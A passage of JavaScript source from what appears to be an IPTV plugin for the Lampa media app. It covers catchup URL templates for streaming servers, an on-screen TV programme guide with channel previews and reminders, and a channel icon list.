            // catchup: http://list.tv:8888/325/mono-timeshift_rel-{offset:1}.m3u8?token=secret
            // stream:  http://list.tv:8888/325/live?token=my_token
            // catchup: http://list.tv:8888/325/{utc}.ts?token=my_token
            // See doc: https://flussonic.ru/doc/proigryvanie/vosproizvedenie-hls/
            return url.replace(/\/(video\d*|mono\d*)\.(m3u8|ts)(\?|$)/, '/$1-\${start}-\${durationfs}.$2$3').replace(/\/(index|playlist)\.(m3u8|ts)(\?|$)/, '/archive-\${start}-\${durationfs}.$2$3').replace(/\/mpegts(\?|$)/, '/timeshift_abs-\${start}.ts$1').replace(/\/live(\?|$)/, '/\${start}.ts$1');
          case 'xc':
            // Example stream and catchup URLs
            // stream:  http://list.tv:8080/my@account.xc/my_password/1477
            // catchup: http://list.tv:8080/timeshift/my@account.xc/my_password/{duration}/{Y}-{m}-{d}:{H}-{M}/1477.ts
            // stream:  http://list.tv:8080/live/my@account.xc/my_password/1477.m3u8
            // catchup: http://list.tv:8080/timeshift/my@account.xc/my_password/{duration}/{Y}-{m}-{d}:{H}-{M}/1477.m3u8
            newUrl = url.replace(/^(https?:\/\/[^/]+)(\/live)?(\/[^/]+\/[^/]+\/)([^/.]+)\.m3u8?$/, '$1/timeshift$3\${(d)M}/\${(b)yyyy-MM-dd:HH-mm}/$4.m3u8').replace(/^(https?:\/\/[^/]+)(\/live)?(\/[^/]+\/[^/]+\/)([^/.]+)(\.ts|)$/, '$1/timeshift$3\${(d)M}/\${(b)yyyy-MM-dd:HH-mm}/$4.ts');
            break;
          case 'default':
            newUrl = source || url;
            break;
          case 'disabled':
            return false;
          default:
            console.log('IPTV', 'Err: no support catchup-type="' + type + '"');
            return false;
        }
        if (newUrl.indexOf('${') < 0) return this.catchupUrl(newUrl, 'shift');
        return newUrl;
      }
    }]);
  }();

  function stopPreview(tvg) {
    tvg.previewActiveCh = null;
    if (tvg.previewVideo) {
      if (typeof tvg.previewVideo.pause === 'function') tvg.previewVideo.pause();
      if (tvg.previewVideo.removeAttribute) tvg.previewVideo.removeAttribute('src');
      if (typeof tvg.previewVideo.load === 'function') tvg.previewVideo.load();
    }
  }
  function updatePreviewCaption(tvg, ch, prog) {
    if (!tvg.el || !tvg.el._previewWrap || !ch) return;
    var pr = tvg.el._previewPr;
    var pc = tvg.el._previewCh;
    var pl = tvg.el._previewLogo;
    var pn = tvg.el._previewNum;
    var num = ch.tvg && /^\d+$/.test((ch.tvg || {}).id + '') ? ch.tvg.id + '' : tvg.channels.indexOf(ch) + 1;
    if (pr) pr.textContent = prog ? tvg._cl(prog.title) : '';
    if (pc) pc.textContent = tvg._cl(ch.name);
    if (pn) pn.textContent = num;
    if (pl) {
      pl.innerHTML = '';
      if (ch.logo) {
        var img = document.createElement('img');
        img.src = ch.logo;
        img.alt = '';
        img.onerror = function () {
          img.removeAttribute('src');
          pl.textContent = tvg._cl(ch.name).substring(0, 2);
        };
        append(pl, img);
      } else pl.textContent = tvg._cl(ch.name).substring(0, 2);
    }
  }
  function playPreview(tvg, ch) {
    if (!tvg.el || !tvg.el._previewWrap || !ch) return;
    stopPreview(tvg);
    var url = ch.url ? Url.prepareUrl(ch.url) : '';
    if (!url || !startsWith(url, 'http')) {
      if (tvg.el._previewWrap) tvg.el._previewWrap.classList.add('mds-tvg__preview--no-video');
      return;
    }
    if (tvg.el._previewWrap) tvg.el._previewWrap.classList.remove('mds-tvg__preview--no-video');
    tvg.previewVideo = tvg.el._previewVideo;
    if (!tvg.previewVideo) return;
    tvg.previewActiveCh = tvg.channels.indexOf(ch) >= 0 ? ch : null;
    tvg.previewVideo.muted = false;
    if (tvg.previewVideo.playsInline !== undefined) tvg.previewVideo.playsInline = true;
    tvg.previewVideo.src = url;
    if (typeof tvg.previewVideo.load === 'function') tvg.previewVideo.load();
    var playPromise = typeof tvg.previewVideo.play === 'function' ? tvg.previewVideo.play() : undefined;
    if (playPromise && playPromise["catch"]) {
      playPromise["catch"](function (err) {
        if (!tvg.previewVideo) return;
        if (err && err.name === 'NotAllowedError' && typeof tvg.previewVideo.play === 'function') {
          tvg.previewVideo.muted = true;
          var p2 = tvg.previewVideo.play();
          if (p2 && p2["catch"]) p2["catch"](function () {});
        }
      });
    }
  }

  function focusNow(tvg) {
    var row = tvg.rows[tvg.focusR];
    if (!row) return;
    if (row.progs) {
      var now = Date.now();
      for (var i = 0; i < row.progs.length; i++) {
        var p = row.progs[i]._prog;
        if (p && now >= p.start && now < p.stop) {
          tvg.focusP = i;
          break;
        }
      }
    }
    tvg.scrollX = Math.max(0, (Date.now() - tvg.startMs) / 3600000 * tvg.hw - tvg.el._grid.clientWidth / 3);
    var grid = tvg.el._grid;
    var gh = grid ? grid.clientHeight : 400;
    tvg.scrollY = Math.max(0, Math.min(tvg.totalH - gh, tvg.focusR * tvg.rh - Math.floor(gh / 2) + Math.floor(tvg.rh / 2)));
    applyScroll(tvg);
    applyFocus(tvg);
  }
  function alignTime(tvg) {
    var row = tvg.rows[tvg.focusR];
    if (!row || !row.progs.length) return;
    var now = Date.now();
    var ref = tvg._midMs || now;
    for (var i = 0; i < row.progs.length; i++) {
      var p = row.progs[i]._prog;
      if (!p) continue;
      if (now >= p.start && now < p.stop) {
        tvg.focusP = i;
        return;
      }
    }
    for (var _i = 0; _i < row.progs.length; _i++) {
      var _p = row.progs[_i]._prog;
      if (!_p) continue;
      if (ref >= _p.start && ref < _p.stop) {
        tvg.focusP = _i;
        return;
      }
    }
    var best = 0,
      bd = Infinity;
    for (var _i2 = 0; _i2 < row.progs.length; _i2++) {
      var _p2 = row.progs[_i2]._prog;
      if (!_p2) continue;
      var d = Math.abs((_p2.start + _p2.stop) / 2 - ref);
      if (d < bd) {
        bd = d;
        best = _i2;
      }
    }
    tvg.focusP = best;
  }
  function applyFocus(tvg) {
    if (!tvg.el) return;
    forEachNode(tvg.el.querySelectorAll('.mds-tvg__prog.focus, .mds-tvg__row--ch.focus'), function (el) {
      el.classList.remove('focus');
    });
    var oldH = tvg.el.querySelector('.mds-tvg__row--ch.hl');
    if (oldH) oldH.classList.remove('hl');
    var oldP = tvg.el.querySelector('.mds-tvg__row--ch.playing');
    if (oldP) oldP.classList.remove('playing');
    var ch = tvg.channels[tvg.focusR];
    var row = tvg.rows[tvg.focusR];
    if (tvg.previewActiveCh) {
      var pac = tvg.previewActiveCh;
      var playingIndex = findIndex(tvg.channels, function (c) {
        return (c.id || '') === (pac.id || '') && (c.name || '') === (pac.name || '');
      });
      if (playingIndex >= 0) {
        var playingRow = tvg.rows[playingIndex];
        var now = Date.now();
        var progEl = playingRow && playingRow.progs ? find(playingRow.progs, function (p) {
          var pData = p._prog;
          return pData && now >= pData.start && now < pData.stop;
        }) : null;
        updatePreviewCaption(tvg, tvg.previewActiveCh, progEl ? progEl._prog : null);
      }
    }
    var cr = tvg.el._chList.querySelector('[data-i="' + tvg.focusR + '"]');
    if (cr) {
      cr.classList.add('hl');
      cr.classList.toggle('mds-tvg__row--ch-zone', tvg.focusZone === 'ch');
      if (tvg.focusZone === 'ch') cr.classList.add('focus');
    }
    forEachNode(tvg.el._chList.querySelectorAll('.mds-tvg__row--ch-zone'), function (r) {
      if (r !== cr) r.classList.remove('mds-tvg__row--ch-zone');
    });
    if (tvg.previewActiveCh) {
      var pac2 = tvg.previewActiveCh;
      var playingIndex2 = findIndex(tvg.channels, function (c) {
        return (c.id || '') === (pac2.id || '') && (c.name || '') === (pac2.name || '');
      });
      if (playingIndex2 >= 0) {
        var playingRow2 = tvg.el._chList.querySelector('[data-i="' + playingIndex2 + '"]');
        if (playingRow2) playingRow2.classList.add('playing');
      }
    }
    if (!row || !row.progs.length) {
      if (ch) updateInfo(tvg, ch, null);
      return;
    }
    if (tvg.focusZone === 'ch') {
      if (row && row.progs.length) {
        var _now = Date.now();
        var currentProg = null;
        for (var i = 0; i < row.progs.length; i++) {
          var p = row.progs[i]._prog;
          if (p && _now >= p.start && _now < p.stop) {
            currentProg = p;
            break;
          }
        }
        updateInfo(tvg, ch, currentProg);
      } else {
        updateInfo(tvg, ch, null);
      }
      var _grid = tvg.el._grid;
      if (_grid) {
        var _gh = _grid.clientHeight;
        var _rT = tvg.focusR * tvg.rh;
        tvg.scrollY = Math.max(0, Math.min(tvg.totalH - _gh, _rT - Math.floor(_gh / 2) + Math.floor(tvg.rh / 2)));
        applyScroll(tvg);
      }
      tvg.loadVisible();
      return;
    }
    tvg.focusP = Math.min(tvg.focusP, row.progs.length - 1);
    var prog = row.progs[tvg.focusP];
    prog.classList.add('focus');
    var grid = tvg.el._grid;
    var pL = parseFloat(prog.style.left);
    var pW = parseFloat(prog.style.width);
    var gw = grid.clientWidth;
    var gh = grid.clientHeight;
    if (pL - tvg.scrollX < 0) tvg.scrollX = Math.max(0, pL - 20);else if (pL + pW - tvg.scrollX > gw) tvg.scrollX = pL + pW - gw + 20;
    var rT = tvg.focusR * tvg.rh;
    if (rT - tvg.scrollY < 0) tvg.scrollY = Math.max(0, rT - tvg.rh);else if (rT + tvg.rh - tvg.scrollY > gh) tvg.scrollY = rT + tvg.rh - gh + tvg.rh;
    applyScroll(tvg);
    updateInfo(tvg, row.ch, prog._prog);
    if (prog._prog) tvg._midMs = (prog._prog.start + prog._prog.stop) / 2;
    tvg.loadVisible();
  }
  function nav(tvg, dx, dy) {
    if (!tvg.isOpen) return;
    if (dy) {
      var nr = tvg.focusR + dy;
      if (nr < 0 || nr >= tvg.channels.length) return;
      if (!tvg.rows[nr]) {
        tvg.loaded[nr] = true;
        tvg.loadEPG(tvg.channels[nr], function (p) {
          tvg.renderRow(nr, p);
          tvg.focusR = nr;
          setTimeout(function () {
            alignTime(tvg);
            applyFocus(tvg);
          }, 100);
        });
        return;
      }
      tvg.focusR = nr;
      alignTime(tvg);
      applyFocus(tvg);
    }
    if (dx) {
      if (tvg.focusZone === 'ch') {
        if (dx > 0) {
          tvg.focusZone = 'prog';
          applyFocus(tvg);
          return;
        }
        return;
      }
      var row = tvg.rows[tvg.focusR];
      if (!row) return;
      if (dx < 0 && tvg.focusP === 0) {
        tvg.focusZone = 'ch';
        applyFocus(tvg);
        return;
      }
      var ni = tvg.focusP + dx;
      if (ni < 0 || ni >= row.progs.length) return;
      tvg.focusP = ni;
      applyFocus(tvg);
    }
  }

  function updateProgRemindBadge(tvg, row, prog) {
    if (!tvg.el || !row) return;
    var el = find(row.progs, function (p) {
      return p._prog && p._prog.start === prog.start;
    });
    if (!el) return;
    var hasRem = prog.stop > Date.now() && Reminders.has(row.ch.name, prog.start);
    el.classList.toggle('mds-tvg__prog--reminded', hasRem);
    var bell = el.querySelector('.mds-tvg__prog-bell');
    if (bell) bell.remove();
    if (hasRem) {
      var bl = document.createElement('div');
      bl.className = 'mds-tvg__prog-bell';
      bl.textContent = '🔔';
      prepend(el, bl);
    }
  }
  function showProgSelector(tvg, row, prog) {
    if (!prog) return;
    var ch = row.ch;
    var now = Date.now();
    if (prog.stop <= now) {
      var archive = Utils.hasArchive(ch);
      var minus = now - archive * 1000 * 60 * 60 * 24;
      if (archive && prog.start > minus && tvg.onPlayArchive) {
        var programs = tvg.ec[ch.id || ch.name] || [];
        var pos = findIndex(programs, function (pr) {
          return pr.start === prog.start;
        });
        var playlist = pos >= 0 ? programs.slice(Math.max(0, pos - 40), pos + 41) : [prog];
        tvg.close();
        tvg.onPlayArchive({
          channel: ch,
          program: prog,
          playlist: playlist
        });
      } else {
        Lampa.Bell.push({
          text: Lampa.Lang.translate('iptv_program_ended'),
          time: 2500
        });
      }
      return;
    }
    if (prog.start <= now) {
      if (tvg.onPlay) {
        tvg.close();
        tvg.onPlay(tvg.focusR);
      }
      return;
    }
    var has = Reminders.has(ch.name, prog.start);
    if (has) {
      Reminders.rm(ch.name, prog.start);
      updateProgRemindBadge(tvg, row, prog);
      Lampa.Bell.push({
        text: Lampa.Lang.translate('iptv_remind_remove_ok'),
        from: tvg._cl(prog.title),
        time: 3000
      });
    } else if (Reminders.add(ch, prog)) {
      updateProgRemindBadge(tvg, row, prog);
      Lampa.Bell.push({
        text: Lampa.Lang.translate('iptv_remind_set_ok') + ': ' + tvg._cl(prog.title),
        time: 4000
      });
    }
  }

  var TVGuide = /*#__PURE__*/function () {
    function TVGuide() {
      _classCallCheck(this, TVGuide);
      this.isOpen = false;
      this.el = null;
      this.channels = [];
      this.filterGroup = '';
      this.startMs = 0;
      this.scrollX = 0;
      this.scrollY = 0;
      this.focusR = 0;
      this.focusP = 0;
      this.rows = [];
      this.loaded = {};
      this.clock = null;
      this._midMs = 0;
      this.rh = 56;
      this.hw = 240;
      this.totalH = 0;
      this.totalW = 0;
      this.ec = {};
      this.onPlay = null;
      this.onPlayArchive = null;
      this.usedModal = false;
      this.previewVideo = null;
      this.focusZone = 'prog';
      this.previewActiveCh = null;
      this.playedChannels = [];
    }
    return _createClass(TVGuide, [{
      key: "_pad",
      value: function _pad(n) {
        return n < 10 ? '0' + n : '' + n;
      }
    }, {
      key: "_hm",
      value: function _hm(ts) {
        var d = new Date(ts);
        return this._pad(d.getHours()) + ':' + this._pad(d.getMinutes());
      }
    }, {
      key: "_ds",
      value: function _ds(ts) {
        var d = new Date(ts);
        var w = ['вс', 'пн', 'вт', 'ср', 'чт', 'пт', 'сб'];
        var m = ['янв', 'фев', 'мар', 'апр', 'мая', 'июн', 'июл', 'авг', 'сен', 'окт', 'ноя', 'дек'];
        return w[d.getDay()] + ', ' + d.getDate() + ' ' + m[d.getMonth()];
      }
    }, {
      key: "_cl",
      value: function _cl(s) {
        return s ? Utils.clear(s) : '';
      }
    }, {
      key: "_safeHtml",
      value: function _safeHtml(s) {
        return (s + '').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
      }
    }, {
      key: "_getCfg",
      value: function _getCfg() {
        return window.innerWidth < 500 ? {
          hourW: 180,
          rowH: 64,
          chanW: 52,
          hours: 6
        } : CFG;
      }
    }, {
      key: "_normTs",
      value: function _normTs(v) {
        return v < 1e12 ? v * 1000 : v;
      }
    }, {
      key: "_normProg",
      value: function _normProg(arr) {
        var _this = this;
        return (arr || []).map(function (p) {
          return _objectSpread2(_objectSpread2({}, p), {}, {
            start: p.start ? _this._normTs(p.start) : 0,
            stop: p.stop ? _this._normTs(p.stop) : 0
          });
        });
      }
    }, {
      key: "loadEPG",
      value: function loadEPG(ch, cb) {
        var _this2 = this;
        var k = ch.id || ch.name;
        if (this.ec[k]) {
          cb(this.ec[k]);
          return;
        }
        if (!ch.id) {
          cb([]);
          return;
        }
        TVApi.program({
          name: ch.name,
          channel_id: ch.id,
          tvg: ch.tvg,
          time: EPG.time(ch)
        }).then(function (prog) {
          _this2.ec[k] = _this2._normProg(prog || []);
          cb(_this2.ec[k]);
        })["catch"](function () {
          return cb([]);
        });
      }
    }, {
      key: "_stopPreview",
      value: function _stopPreview() {
        stopPreview(this);
      }
    }, {
      key: "_playPreview",
      value: function _playPreview(ch) {
        playPreview(this, ch);
      }
    }, {
      key: "_updatePreviewCaption",
      value: function _updatePreviewCaption(ch, prog) {
        updatePreviewCaption(this, ch, prog);
      }
    }, {
      key: "close",
      value: function close() {
        if (!this.isOpen) return;
        this.isOpen = false;
        this._stopPreview();
        this.playedChannels = [];
        document.body.classList.remove('mds-tvg-open');
        if (this.clock) clearInterval(this.clock);
        if (this.usedModal) {
          var modalEl = Lampa.Modal.render && Lampa.Modal.render();
          if (modalEl) modalEl.removeClass('mds-tvg-modal');
          this.el = null;
          this.rows = [];
          this.usedModal = false;
          Lampa.Controller.toggle('content');
          Lampa.Modal.close();
        } else {
          if (this.el) this.el.remove();
          this.el = null;
          this.rows = [];
          Lampa.Controller.toggle('content');
          try {
            if (history.state && history.state.mdsTvGuide) history.back();
          } catch (e) {}
        }
      }
    }, {
      key: "buildDOM",
      value: function buildDOM$1(c) {
        buildDOM(this, c);
      }
    }, {
      key: "renderRow",
      value: function renderRow$1(idx, programs) {
        renderRow(this, idx, programs);
      }
    }, {
      key: "updateInfo",
      value: function updateInfo$1(ch, prog) {
        updateInfo(this, ch, prog);
      }
    }, {
      key: "applyScroll",
      value: function applyScroll$1() {
        applyScroll(this);
      }
    }, {
      key: "_updateNowPos",
      value: function _updateNowPos() {
        updateNowPos(this);
      }
    }, {
      key: "findProg",
      value: function findProg$1(cx, cy) {
        return findProg(this, cx, cy);
      }
    }, {
      key: "_initTouch",
      value: function _initTouch(grid) {
        initTouch(this, grid);
      }
    }, {
      key: "applyFocus",
      value: function applyFocus$1() {
        applyFocus(this);
      }
    }, {
      key: "alignTime",
      value: function alignTime$1() {
        alignTime(this);
      }
    }, {
      key: "focusNow",
      value: function focusNow$1() {
        focusNow(this);
      }
    }, {
      key: "nav",
      value: function nav$1(dx, dy) {
        nav(this, dx, dy);
      }
    }, {
      key: "loadVisible",
      value: function loadVisible() {
        var _this3 = this;
        var s = Math.max(0, Math.floor(this.scrollY / this.rh) - 2);
        var e = Math.min(this.channels.length, Math.ceil((this.scrollY + (this.el ? this.el._grid.clientHeight : 600)) / this.rh) + 2);
        var _loop = function _loop(i) {
          if (!_this3.loaded[i]) {
            _this3.loaded[i] = true;
            _this3.loadEPG(_this3.channels[i], function (p) {
              return _this3.renderRow(i, p);
            });
          }
        };
        for (var i = s; i < e; i++) {
          _loop(i);
        }
      }
    }, {
      key: "_bindSelectorEvents",
      value: function _bindSelectorEvents() {
        var _this4 = this;
        if (!this.el) return;
        var onFocus = function onFocus(e) {
          var el = e.target && closest(e.target, '.selector') || e.target;
          if (!el) return;
          if (el.classList.contains('mds-tvg__row--ch')) {
            var i = parseInt(el.getAttribute('data-i'), 10);
            if (!isNaN(i) && i >= 0) {
              _this4.focusZone = 'ch';
              _this4.focusR = i;
              _this4.applyFocus();
              if (!_this4.rows[i]) {
                _this4.loaded[i] = true;
                _this4.loadEPG(_this4.channels[i], function (p) {
                  _this4.renderRow(i, p);
                  _this4.alignTime();
                  _this4._playPreview(_this4.channels[i]);
                  _this4.applyFocus();
                  if (typeof Lampa.Controller !== 'undefined' && _this4.el) Lampa.Controller.collectionSet(_this4.el);
                });
              } else _this4._playPreview(_this4.channels[i]);
            }
          } else if (el.classList.contains('mds-tvg__prog')) {
            var r = parseInt(el.getAttribute('data-r'), 10);
            var p = parseInt(el.getAttribute('data-p'), 10);
            if (!isNaN(r) && !isNaN(p)) {
              _this4.focusZone = 'prog';
              _this4.focusR = r;
              _this4.focusP = p;
              _this4.applyFocus();
            }
          }
          if (typeof Navigator !== 'undefined') Navigator.focused(el);
        };
        $(this.el).on('hover:focus hover:hover', '.selector', onFocus);
        var onEnter = function onEnter(e) {
          var el = e.target && closest(e.target, '.selector') || e.target;
          if (el) _this4._handleSelectorEnter(el);
        };
        $(this.el).on('hover:enter', '.selector', onEnter);
        $(this.el).on('click', '.selector', function (e) {
          if (typeof Lampa !== 'undefined' && Lampa.DeviceInput && !Lampa.DeviceInput.canClick(e.originalEvent || e)) return;
          var el = e.target && closest(e.target, '.selector') || e.target;
          if (el) onEnter({
            target: el
          });
        });
      }
    }, {
      key: "_syncCollectionFocus",
      value: function _syncCollectionFocus() {
        if (!this.el || typeof Lampa.Controller === 'undefined') return;
        var cr = this.el._chList && this.el._chList.querySelector('[data-i="' + this.focusR + '"]');
        var prog = this.rows[this.focusR] && this.rows[this.focusR].progs && this.rows[this.focusR].progs[this.focusP];
        var target = this.focusZone === 'prog' && prog ? prog : cr;
        if (target) Lampa.Controller.collectionFocus(target, this.el);
      }
    }, {
      key: "_handleSelectorEnter",
      value: function _handleSelectorEnter(focusEl) {
        var _this5 = this;
        if (!focusEl) focusEl = this.el && this.el.querySelector('.selector.focus');
        if (!focusEl) return;
        var key = (focusEl.getAttribute('data-i') || '') + '_' + (focusEl.getAttribute('data-r') || '') + '_' + (focusEl.getAttribute('data-p') || '');
        if (this._lastEnterKey === key && Date.now() - (this._lastEnterTime || 0) < 150) return;
        this._lastEnterKey = key;
        this._lastEnterTime = Date.now();
        if (focusEl.classList.contains('mds-tvg__row--ch')) {
          var i = parseInt(focusEl.getAttribute('data-i'), 10);
          if (isNaN(i) || i < 0) return;
          var ch = this.channels[i];
          if (!ch) return;
          this.focusZone = 'ch';
          this.focusR = i;
          if (!this.rows[i]) {
            this.loaded[i] = true;
            this.loadEPG(ch, function (p) {
              _this5.renderRow(i, p);
              _this5.alignTime();
              _this5._playPreview(ch);
              _this5.applyFocus();
              _this5._syncCollectionFocus();
              if (typeof Lampa.Controller !== 'undefined' && _this5.el) Lampa.Controller.collectionSet(_this5.el);
            });
            return;
          }
          this.alignTime();
          var wasPlayed = this.playedChannels.some(function (c) {
            return (c.id || '') === (ch.id || '') && (c.name || '') === (ch.name || '');
          });
          if (this.previewActiveCh && (this.previewActiveCh.id || '') === (ch.id || '') && (this.previewActiveCh.name || '') === (ch.name || '') && this.onPlay) {
            if (wasPlayed) {
              this.close();
              this.onPlay(i);
            } else this.playedChannels.push(ch);
          } else {
            this._playPreview(ch);
          }
          this.applyFocus();
          this._syncCollectionFocus();
        } else if (focusEl.classList.contains('mds-tvg__prog')) {
          var r = parseInt(focusEl.getAttribute('data-r'), 10);
          var p = parseInt(focusEl.getAttribute('data-p'), 10);
          var row = this.rows[r];
          if (!row || !row.progs || !row.progs[p]) return;
          var prog = row.progs[p]._prog;
          if (!prog) {
            Lampa.Noty.show(Lampa.Lang.translate('iptv_noprogram'));
            return;
          }
          this.focusZone = 'prog';
          this.focusR = r;
          this.focusP = p;
          this.applyFocus();
          this._syncCollectionFocus();
          showProgSelector(this, row, prog);
        }
      }
    }, {
      key: "open",
      value: function open(opts) {
        var _this6 = this;
        if (this.isOpen) return;
        var channels = opts.channels || [];
        this.filterGroup = opts.filterGroup || '';
        this.onPlay = opts.onPlay || null;
        this.onPlayArchive = opts.onPlayArchive || null;
        if (!channels.length) {
          Lampa.Noty.show(Lampa.Lang.translate('iptv_noprogram'));
          return;
        }
        this.isOpen = true;
        this.previewActiveCh = null;
        this.playedChannels = [];
        document.body.classList.add('mds-tvg-open');
        this.channels = channels.slice(0, CFG.maxCh);
        this.ec = {};
        this.loaded = {};
        this.rows = [];
        this.scrollX = 0;
        this.scrollY = 0;
        var focusCh = opts.focusChannel;
        this.focusR = focusCh ? Math.max(0, findIndex(channels, function (c) {
          return (c.id || '') === (focusCh.id || '') && (c.name || '') === (focusCh.name || '');
        })) : 0;
        if (this.focusR < 0) this.focusR = 0;
        this.focusP = 0;
        this._midMs = 0;
        var c = this._getCfg();
        this.rh = c.rowH;
        this.hw = c.hourW;
        var d = new Date(Date.now());
        d.setMinutes(0, 0, 0);
        this.startMs = d.getTime() - 3600000;
        this.totalH = this.channels.length * this.rh;
        this.totalW = c.hours * this.hw;
        this.scrollY = Math.max(0, this.focusR * this.rh - 150);
        this.buildDOM(c);
        this.usedModal = false;
        this.el.classList.add('mds-tvg--fullscreen');
        document.body.appendChild(this.el);
        this.focusZone = 'ch';
        this.loaded[this.focusR] = true;
        this.loadEPG(this.channels[this.focusR], function (p) {
          _this6.renderRow(_this6.focusR, p);
          _this6.alignTime();
          _this6.focusNow();
          _this6._playPreview(_this6.channels[_this6.focusR]);
          _this6.loadVisible();
        });
        requestAnimationFrame(function () {
          requestAnimationFrame(function () {
            _this6.applyFocus();
            _this6._playPreview(_this6.channels[_this6.focusR]);
            _this6.loadVisible();
          });
        });
        var _doFocus = function doFocus() {
          if (!_this6.isOpen) return;
          _this6.applyFocus();
          _this6._playPreview(_this6.channels[_this6.focusR]);
          if (_this6.rows[_this6.focusR]) _this6.focusNow();else setTimeout(_doFocus, 100);
        };
        setTimeout(_doFocus, 300);
        this._bindSelectorEvents();
        Lampa.Controller.add('epg_guide', {
          toggle: function toggle() {
            if (_this6.el && _this6.el.querySelector('.selector')) {
              Lampa.Controller.collectionSet(_this6.el);
              var cr = _this6.el._chList && _this6.el._chList.querySelector('[data-i="' + _this6.focusR + '"]');
              var prog = _this6.rows[_this6.focusR] && _this6.rows[_this6.focusR].progs && _this6.rows[_this6.focusR].progs[_this6.focusP];
              var target = _this6.focusZone === 'prog' && prog ? prog : cr;
              Lampa.Controller.collectionFocus(target || cr || false, _this6.el);
            }
          },
          up: function up() {
            _this6.nav(0, -1);
            _this6._syncCollectionFocus();
          },
          down: function down() {
            _this6.nav(0, 1);
            _this6._syncCollectionFocus();
          },
          left: function left() {
            _this6.nav(-1, 0);
            _this6._syncCollectionFocus();
          },
          right: function right() {
            _this6.nav(1, 0);
            _this6._syncCollectionFocus();
          },
          back: function back() {
            return _this6.close();
          },
          enter: function enter() {
            return _this6._handleSelectorEnter(null);
          }
        });
        Lampa.Controller.toggle('epg_guide');
      }
    }], [{
      key: "open",
      value: function open(opts) {
        if (!TVGuide._inst) TVGuide._inst = new TVGuide();
        TVGuide._inst.open(opts);
      }
    }, {
      key: "close",
      value: function close() {
        if (TVGuide._inst) TVGuide._inst.close();
      }
    }]);
  }();
  _defineProperty(TVGuide, "_inst", null);

  function init$3() {
    if (!TVGuide._inst) TVGuide._inst = new TVGuide();
    Reminders.clean();
    setInterval(checkReminders, CFG.checkS * 1000);
    window.addEventListener('popstate', function () {
      if (TVGuide._inst && TVGuide._inst.isOpen) TVGuide._inst.close();
    });
  }
  if (window.appready) init$3();else Lampa.Listener.follow('app', function (e) {
    if (e.type === 'ready') init$3();
  });

  var Icons = /*#__PURE__*/function () {
    function Icons(listener) {
      var _this = this;
      _classCallCheck(this, Icons);
      this.listener = listener;
      this.position = 0;
      this.scroll = new Lampa.Scroll({
        mask: !window.iptv_mobile,
        over: true,
        end_ratio: 2,
        horizontal: window.iptv_mobile
      });
      this.html = document.createElement('div');
      this.html.addClass('iptv-channels');
      this.scroll.append(this.html);
      if (!window.iptv_mobile) this.scroll.minus();
      this.scroll.onEnd = function () {
        _this.position++;
        _this.next();
      };
      this.listener.follow('icons-load', function (data) {
        _this.icons = data.icons;
        if (data.menu.favorites) {
          _this.icons.sort(function (a, b) {
            var ta = a.added || 0;
            var tb = b.added || 0;
            return ta < tb ? -1 : ta > tb ? 1 : 0;
          });
          _this.sort();
        }
        _this.icons_clone = Lampa.Arrays.clone(_this.icons);
        _this.html.empty();
        _this.scroll.reset();
        _this.position = 0;
        _this.last = false;
        _this.next();
        var channel = Pilot.notebook('channel');
        if (channel >= 0 && channel <= _this.icons.length && window.lampa_settings.iptv) {
          setTimeout(function () {
            _this.listener.send('play', {
              position: channel,
              total: _this.icons.length
            });
          }, 1000);
        }
      });
    }
    return _createClass(Icons, [{
      key: "sort",
      value: function sort() {
        var sort_type = Lampa.Storage.field('iptv_favotite_sort');
        if (Lampa.Account.hasPremium() && sort_type !== 'add') {
          this.icons.sort(function (a, b) {
            if (sort_type == 'name') {
              return a.name < b.name ? -1 : a.name > b.name ? 1 : 0;
            } else if (sort_type == 'view') {
              var va = a.view || 0;
              var vb = b.view || 0;
              return va < vb ? 1 : va > vb ? -1 : 0;
            }
          });
        }
      }
    }, {
      key: "active",
      value: function active(item) {
        var active = this.html.find('.active');
        if (active) active.removeClass('active');
        item.addClass('active');
      }
    }, {
      key: "icon",
      value: function icon(item, element) {
        var icons = item.find('.iptv-channel__icons');
        icons.empty();
        if (TVFavorites.find(element)) icons.append(Lampa.Template.js('modss_iptv_icon_fav'));
        if (Locked.find(Locked.format('channel', element))) icons.append(Lampa.Template.js('modss_iptv_icon_lock'));
      }
    }, {
      key: "next",
      value: function next() {
        var _this2 = this;
        var views = 10;
        var start = this.position * views;
        this.icons.slice(start, start + views).forEach(function (element, index) {
          delete element.target;
          var item = document.createElement('div');
          var body = document.createElement('div');
          var img = document.createElement('img');
          var chn = document.createElement('div');
          var icn = document.createElement('div');
          var position = start + index;
          chn.text((position + 1).pad(3));
          item.addClass('iptv-channel selector layer--visible layer--render');
          body.addClass('iptv-channel__body');
          img.addClass('iptv-channel__ico');
          chn.addClass('iptv-channel__chn');
          icn.addClass('iptv-channel__icons');
          body.append(img);
          item.append(body);
          item.append(chn);
          item.append(icn);
          _this2.icon(item, element);
          _this2.listener.follow('update-channel-icon', function (channel) {
            if (channel.name == element.name) _this2.icon(item, element);
          });
          item.on('visible', function () {
            img.onerror = function () {
              img.removeAttribute('src');
              img.style.display = 'none';
              var simb = document.createElement('div');
              simb.addClass('iptv-channel__simb');
              simb.text(element.name.length <= 3 ? element.name.toUpperCase() : element.name.replace(/[^a-z|а-я|0-9]/gi, '').toUpperCase()[0]);
              var text = document.createElement('div');
              text.addClass('iptv-channel__name');
              text.text(Utils.clear(element.name));
              body.append(simb);
              body.append(text);
            };
            img.onload = function () {
              item.addClass('loaded');
              if ((img.naturalWidth || img.width) < 90) item.addClass('small--icon');
            };
            if (element.logo) img.src = element.logo;else img.onerror();
          });
          item.on('hover:focus', function () {
            _this2.active(item);
            _this2.scroll.update(item);
            if (_this2.last !== item) _this2.listener.send('details-load', element);
            _this2.last = item;
          }).on('hover:hover hover:touch', function () {
            Navigator.focused(item);
            _this2.active(item);
            if (_this2.last !== item) _this2.listener.send('details-load', element);
            _this2.last = item;
          }).on('hover:long', function () {
            var groupName = element.group || '';
            var groupChannels = groupName ? _this2.icons.filter(function (c) {
              return c.group === groupName;
            }) : _this2.icons;
            var items = [{
              title: Lampa.Lang.translate('iptv_param_guide') + (groupName ? ' — ' + Utils.clearMenuName(groupName) : ''),
              type: 'epg_guide'
            }, {
              title: Lampa.Lang.translate(TVFavorites.find(element) ? 'iptv_remove_fav' : 'iptv_add_fav'),
              type: 'favorite'
            }, {
              title: Lampa.Lang.translate(Locked.find(Locked.format('channel', element)) ? 'iptv_channel_unlock' : 'iptv_channel_lock'),
              type: 'locked'
            }];
            Lampa.Select.show({
              title: Lampa.Lang.translate('title_action'),
              items: items,
              onSelect: function onSelect(a) {
                _this2.toggle();
